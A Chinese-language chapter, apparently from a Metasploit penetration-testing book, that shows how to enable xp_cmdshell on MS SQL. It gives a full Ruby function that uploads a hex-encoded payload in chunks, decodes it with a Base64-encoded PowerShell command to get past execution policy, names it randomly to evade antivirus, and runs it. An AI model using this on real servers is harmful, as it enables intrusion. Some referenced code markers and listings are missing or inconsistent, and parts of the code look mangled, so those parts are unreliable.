# 第13章：构建自己的模块

如果你有一些编程经验，构建自己的 Metasploit 模块很简单。你可以用 Python 和 Ruby 编写 Metasploit 模块。由于 Metasploit 主要基于 Ruby，因此我们将选择 Ruby。

编写自己的 Metasploit 模块的最佳方法之一是修改现有模块的代码。因此，我们将首先探索一个针对 MS SQL 的现有 Metasploit 模块，以便你了解其工作原理。然后，我们将以其为基础构建我们自己的 MS SQL 模块。

如果你对 Ruby 语言有所了解，应该能够跟上。但是，如果你发现自己难以理解本章中的概念，我们建议你先积累 Ruby 知识，稍后再回过头来阅读本章。

## 在 MS SQL 上执行命令

让我们研究一个名为 `mssql_powershell` 的模块，它利用了 Josh Kelley (winfang) 和 David Kennedy 的技术。该模块已经存在于 Metasploit 中，其代码为如何构建自己的模块提供了很好的范例。

该模块针对安装了 Microsoft PowerShell 的 Windows 平台。它将标准的 MSF 二进制 payload 转换为十六进制 blob（二进制数据的十六进制表示），然后通过 MS SQL 命令将其传输到目标系统。一旦此 payload 到达目标系统，PowerShell 脚本就会将十六进制数据转换回二进制可执行文件，执行它，并为攻击者提供一个 shell。

将二进制转换为十六进制，通过 MS SQL 传输，然后再转换回二进制的能力是 Metasploit 框架强大功能的绝佳示例。在进行渗透测试时，你会遇到许多不熟悉的场景，而你即时创建或修改模块和漏洞的能力将使你能够适应这些情况。一旦你很好地理解了框架，你应该能够相对快速地编写这些模块。

## 启用管理员级存储过程

我们将对 MS SQL 使用我们的模块。如果你还没有设置测试 MS SQL 实例，请参阅附录 A 了解设置说明。

现在，让我们探讨攻击者或渗透测试人员可能访问 MS SQL 实例的方式。正如我们在第 6 章中讨论的，你可以使用 Metasploit 辅助模块扫描系统，然后使用暴力破解来猜测凭据。

一旦你获得了账户的访问权限，就可以执行许多任务，包括调用名为 `xp_cmdshell` 的管理级存储过程。在 SQL 中，存储过程是可重用的代码段，而 `xp_cmdshell` 允许你在 SQL 服务器服务使用的相同安全上下文下执行操作系统命令。我们使用的 MS SQL 版本默认禁用了此存储过程，但如果你在 MS SQL 中具有 `sysadmin` 角色，则可以使用 SQL 命令重新启用它。

要启用存储过程，请启动你在附录 A 中配置的 Windows 虚拟机，然后单击“开始”并启动 Microsoft SQL Server Management Studio。单击“新建查询”以打开一个新的查询窗口。

你将首先运行一个查询来帮助识别具有 `sysadmin` 权限的用户帐户。运行以下查询以查看具有此级别访问权限的所有用户，然后成为这些用户之一：

```sql
SELECT name, type_desc, is_disabled FROM master.sys.server_principals
WHERE IS_SRVROLEMEMBER ('sysadmin', name) = 1
```

如果你具有 `sysadmin` 角色，几乎可以保证完全破坏系统。在 MS SQL 查询窗口中运行以下命令以启用 `xp_cmdshell` 存储过程：

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
xp_cmdshell "ipconfig";
```

我们将 `sp_configure` 标志设置为 1，以便我们可以看到高级选项。然后，我们运行 `RECONFIGURE` 命令，以便我们的更改生效，并运行 `EXEC sp_configure` 以显示所有配置。我们设置 `xp_cmdshell` 标志，并再次使用 `RECONFIGURE` 命令应用配置。

最后，为了确保我们的更改成功，我们使用 `xp_cmdshell` 存储过程在操作系统上执行命令。在此示例中，我们执行 `ipconfig` 操作系统命令。

## 创建新模块

假设你想开发自己的针对 MS SQL 的模块。假设你正在进行渗透测试，遇到一个运行此类 MS SQL 服务器的系统。你已经暴力破解了 SQL 服务器的密码，并获得了 `xp_cmdshell` 存储过程的访问权限。现在你需要将一个 Meterpreter payload 传送到系统上，但除了 1433 之外的所有端口都已关闭。你不知道是物理防火墙到位还是使用了基于 Windows 的防火墙，但你不想修改端口列表或关闭防火墙，因为这可能会引起怀疑。

有时，当你需要将 Meterpreter payload 传送到端口受限的系统时，使用 PowerShell 会有所帮助。我们将使用 Metasploit 将二进制 payload 转换为十六进制，然后使用 PowerShell 将十六进制转换回可以执行的二进制文件。

我们不会从头开始创建 Metasploit 模块，而是通过复制另一个模块来创建模板：我们刚刚研究过的 `mssql_payload` 漏洞。

接下来，我们将整个编码的可执行文件转换为原始十六进制格式 ❷。此行中的 `H*` 仅表示“将文件作为二进制文件打开并将其放在十六进制表示中”。然后，我们创建一个随机的、由 8 个字母组成的文件名 ❸。通常最好随机化此名称以避开防病毒软件。

我们还告诉攻击者 payload 将保留在操作系统的 SQL 服务器的 `/Temp` 目录中 ❹。但是，在将这些十六进制值存储到目标计算机上之前，我们需要创建一个 PowerShell 脚本，该脚本将把包含十六进制值的文件转换为我们可执行的二进制文件。

我们通过 PowerShell 创建这个十六进制到二进制（`h2b`）转换方法 ❺。此代码本质上创建了一个字节数组，该数组将基于十六进制的 Metasploit payload 写入为二进制文件（`{var_payload}` 是通过 Metasploit 指定的随机名称，`gc` 命令是 `get content` 的缩写，从文件中读取内容）。

由于 MS SQL 有字符数限制，我们需要将十六进制 payload 分成 500 字节的块，以便每次查询发送。这种拆分的一个副作用是回车换行符（CRLF）被添加到目标上的文件中，我们必须去除这些字符 ❻。如果我们不这样做，就会破坏二进制文件，使其无法正常执行。请注意，我们只是重新指定 `$s` 变量来将 `'r'` 和 `'n'` 替换为空。这有效地删除了 CRLF。

一旦我们去除了 CRLF，就会在基于十六进制的 Metasploit payload 上调用 `Convert::ToByte`。我们告诉 PowerShell 文件的格式是 base-16（十六进制格式），并让它将 payload 写入一个名为 `#{var_payload}.exe` 的文件，这是一个随机的 payload 名称。

通过将 `h2b` 字符串 ❻ 转换为 Unicode，然后对结果字符串进行 Base64 编码 ❼，我们可能会成功绕过阻止不受信任脚本运行的正常执行限制。对命令进行编码允许我们向一个命令添加大量代码，而无需担心执行限制策略。

然后，我们打印一条消息，说明我们已使用 `-EncodedCommand` PowerShell 命令将 payload 转换并发送到目标，该命令执行 Base64 编码的 PowerShell ❹。

以下显示了整个 `powershell_upload_exec` 函数（如最终在 `mssql.rb` 中所示）：

```ruby
def powershell_upload_exec(exe, debug=false)
  # Hex converter
  hex = exe.unpack("H*")[0]
  # Create a random alpha 8 character name.
  var_payload = rand_text_alpha(8)
  print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")

  # Grabs a hex file and converts it to binary through PowerShell.
  h2b = "$s = gc 'C:\\Windows\\Temp\\#{var_payload}';$s = [string]::Join('', $s);$s = $s.Replace('r',''); $s = $s.Replace('n','');$b = new- object byte[] $($s.Length/2);0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($_*2,2),16)}; [IO.File]::WriteAllBytes('C:\\Windows\\Temp\\#{var_payload}.exe',$b)"
  h2b_unicode = Rex::Text.to_unicode(h2b)
  # Base64 encode the file.
  h2b_encoded = Rex::Text.encode_base64(h2b_unicode)

  print_status("Uploading the payload #{var_payload}, please be patient...")
  idx = 0
  cnt = 500
  while(idx < hex.length - 1)
    mssql_xpcmdshell("cmd.exe /c echo #{hex[idx, cnt]} >> C:\\Windows\\Temp\\#{var_payload}", false)
    idx += cnt
  end

  print_status("Converting the payload utilizing PowerShell EncodedCommand...")
  mssql_xpcmdshell("powershell -EncodedCommand #{h2b_encoded}", debug)
  print_status("Running: cmd.exe /c del C:\\Windows\\Temp\\#{var_payload}")
  mssql_xpcmdshell("cmd.exe /c del C:\\Windows\\Temp\\#{var_payload}", debug)
  print_status("Executing the payload...")
  mssql_xpcmdshell("C:\\Windows\\Temp\\#{var_payload}.exe", false, {:timeout => 1})
  print_status("Be sure to clean up #{var_payload}.exe...")
end
```

## 总结

在本章中，我们介绍了使用 Metasploit 最强大的方法之一：利用现有模块代码，对其进行调整，并添加原始代码以实现你的目标。作为练习，我们鼓励你阅读其他 Metasploit 模块的代码以弄清楚它们的工作原理，然后修改它们，使它们成为你自己的。

在下一章中，我们将使用一种称为模糊测试的技术来发现应用程序中的错误和漏洞。我们将在 Metasploit 中编写自己的模糊测试器，然后编写一个 Metasploit 模块来利用我们发现的漏洞。
